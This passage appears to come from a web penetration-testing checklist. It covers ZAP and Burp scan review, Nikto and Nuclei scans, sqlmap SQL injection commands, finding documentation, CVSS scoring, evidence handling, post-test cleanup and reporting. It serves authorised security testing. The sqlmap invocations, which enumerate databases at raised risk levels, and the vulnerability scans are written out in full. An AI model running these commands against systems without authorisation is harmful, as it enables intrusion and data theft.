For active scan: ensure authenticated session configured in ZAP
Right-click target → Active Scan → Configure scan policy
Use Ajax Spider first for SPA applications (React/Angular/Vue)
ZAP: Report → Generate Report → HTML format → save to /reports/
Verify all Medium+ alerts manually before including in report
items.expected: All ZAP findings reviewed and triaged. Real findings added to checklist. False positives noted.

items.name: Burp Suite Passive Scan Review
items.how: Review Burp passive scan issues accumulated during manual browsing session.
cases: Burp Dashboard → Issues → filter by Severity: High, Medium
Review for: mixed content, missing headers, weak cookies, info disclosure, CSRF
Target → Issues tab → per-host view of all passive findings
Burp Comparer: compare admin vs regular user responses for access control
Burp Sequencer: run on session tokens → FIPS analysis report
Right-click interesting requests → Scan for issues
Export Burp project file as backup: Burp → Save project
items.expected: All passive findings reviewed. Genuine findings added to checklist. Burp project file saved as evidence.

items.name: Nikto & Nuclei Automated Scans
items.how: Run Nikto for web server misconfigs and Nuclei for known CVEs, exposures, and misconfigurations.
cases: nikto -h https://target.com -ssl -output nikto_report.html
nikto: review missing headers, dangerous files, outdated software, known CVEs
nuclei -u https://target.com -t cves/ -severity critical,high -o nuclei_cves.txt
nuclei -u https://target.com -t misconfigurations/ -severity high,medium
nuclei -u https://target.com -t exposures/ -o nuclei_exposures.txt
nuclei -u https://target.com -t technologies/ (fingerprint)
Manually verify ALL Critical and High Nuclei findings before reporting
items.expected: All tool findings reviewed. Critical and High findings manually verified. No unverified findings in final report.

items.name: sqlmap Automated SQLi Scan
items.how: Run sqlmap against all identified injection-susceptible endpoints for comprehensive SQL injection testing.
cases: sqlmap -u 'https://target.com/page?id=1' --batch --dbs --level=3 --risk=2
sqlmap POST: sqlmap -u URL --data='id=1&name=test' --batch
Cookie injection: sqlmap -u URL --cookie='id=1' --batch
Header injection: sqlmap -u URL --headers='User-Agent: *' --batch
All techniques: sqlmap -u URL --technique=BEUSTQ --batch
Save output: sqlmap -u URL --output-dir=./sqlmap-results
Review sqlmap log for confirmed injection points and dumped data
items.expected: No confirmed SQL injection vectors. All sqlmap tests return no vulnerable parameters.

items.name: Finding Documentation Template
items.how: Document every confirmed finding with all required fields before moving to the next test.
cases: Title: short descriptive name — "SQL Injection in /api/search endpoint, id parameter"
Affected URL + parameter: exact vulnerable URL and parameter name
Severity: Critical/High/Medium/Low/Info with CVSS 3.1 score
CWE Reference: CWE-89 (SQL Injection)
Description: what is the vulnerability, why it exists, what code path is affected
Steps to Reproduce: numbered steps, exact request/response with screenshots
Evidence: Burp request/response screenshot, HTTP request in code block
Impact: what attacker can achieve — data exfil, account takeover, RCE, DoS?
Remediation: specific technical fix with code example (use parameterized queries: cmd.Parameters.Add(...))
References: OWASP link, CWE link, CVE if applicable
items.expected: Every finding documented with all required fields. Evidence attached. Remediation specific and actionable.

items.name: CVSS 3.1 Scoring for All Findings
items.how: Calculate CVSS 3.1 base scores for each finding for objective severity comparison.
cases: NVD CVSS calculator: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator
Base metrics: Attack Vector (N/A/L/P), Attack Complexity (L/H), Privileges Required (N/L/H), User Interaction (N/R), Scope (U/C), CIA impact (N/L/H)
Example: Unauthenticated SQLi = CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
Example: Stored XSS requiring auth = CVSS 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
Map scores: 9.0-10.0=Critical, 7.0-8.9=High, 4.0-6.9=Medium, 0.1-3.9=Low
Document temporal metrics if applicable (exploit availability, remediation level)
items.expected: All findings have documented CVSS 3.1 base scores. Scoring consistent and defensible.

items.name: Evidence Organisation & Chain of Custody
items.how: Organise all evidence per finding with proper naming and hash verification.
cases: Create /findings/F001-SQLi-search-endpoint/ folder per finding
Screenshots: annotate with red boxes on vulnerable areas
Burp: right-click request → Save item → save to findings folder
Burp: Copy as curl command → paste in finding for reproduction
ZAP: File → Save Session → keep as backup
sqlmap: --output-dir saves full output including extracted data
Video recording for complex multi-step findings (OBS Studio)
Hash evidence files: sha256sum evidence_file → document hash for integrity
items.expected: All evidence organised per finding. Each finding independently reproducible from documentation alone.

items.name: End-of-Engagement Cleanup
items.how: Remove all test data, payloads, and test accounts from the application before leaving.
cases: Remove ALL stored XSS payloads from comment fields, profiles, etc.
Delete ALL test user accounts created during testing
Remove ANY uploaded test files (web shells, SVG XSS, test images)
Delete test records: orders, posts, comments containing payloads
Verify no unintended persistent impact left in the application
Confirm with client: application functioning normally after testing
Export final Burp project file to /reports/ folder as backup
Export OWASP ZAP report to /reports/ folder
Compile final list of test accounts, what was tested, and what was removed
items.expected: Application in exact same state as before testing. All payloads and test data removed. Client confirmed no residual impact.

items.name: Executive Summary & Final Report
items.how: Write executive summary and compile final penetration test report.
cases: Overall risk rating: Critical/High/Medium/Low (based on highest unmitigated finding)
Finding count by severity: X Critical, Y High, Z Medium, N Low, M Info
Key findings in business terms (no jargon): "An attacker can log in as any user without knowing their password"
Overall security posture vs industry benchmark (if applicable)
Top 3-5 prioritized remediation items with business impact
Positive findings: what security controls work well (good for client morale)
Testing methodology: tools used, scope tested, test dates, environment type
Appendix: full technical findings + CVSS scores + CWE references + OWASP references
items.expected: Executive summary understandable to non-technical C-suite. Full technical report with all findings, evidence, and remediation.
